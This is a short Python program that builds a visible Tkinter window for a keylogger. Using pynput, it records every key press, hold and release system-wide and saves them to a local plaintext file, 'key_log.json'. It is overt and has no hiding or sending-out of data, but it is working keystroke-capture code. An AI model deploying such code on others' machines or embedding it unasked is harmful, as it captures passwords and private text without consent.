import tkinter as tk
from tkinter import messagebox
from pynput import keyboard
import json
import threading

class KeyloggerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger")
        self.root.geometry("300x150")

        self.label = tk.Label(root, text='Click "Start" to begin keylogging.')
        self.label.pack(pady=10)

        self.start_button = tk.Button(root, text="Start", command=self.start_keylogger)
        self.start_button.pack(side=tk.LEFT, padx=10)

        self.stop_button = tk.Button(root, text="Stop", command=self.stop_keylogger, state=tk.DISABLED)
        self.stop_button.pack(side=tk.RIGHT, padx=10)

        self.listener = None
        self.keys_used = []
        self.flag = False

    def start_keylogger(self):
        self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        self.listener.start()
        self.label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'key_log.json'")
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)

    def stop_keylogger(self):
        if self.listener:
            self.listener.stop()
        self.label.config(text="Keylogger stopped.")
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)

    def generate_json_file(self):
        with open('key_log.json', 'w') as key_log:
            json.dump(self.keys_used, key_log)

    def on_press(self, key):
        if not self.flag:
            self.keys_used.append({'Pressed': f'{key}'})
            self.flag = True
        else:
            self.keys_used.append({'Held': f'{key}'})
        self.generate_json_file()

    def on_release(self, key):
        self.keys_used.append({'Released': f'{key}'})
        if self.flag:
            self.flag = False
        self.generate_json_file()

def main():
    root = tk.Tk()
    app = KeyloggerGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()
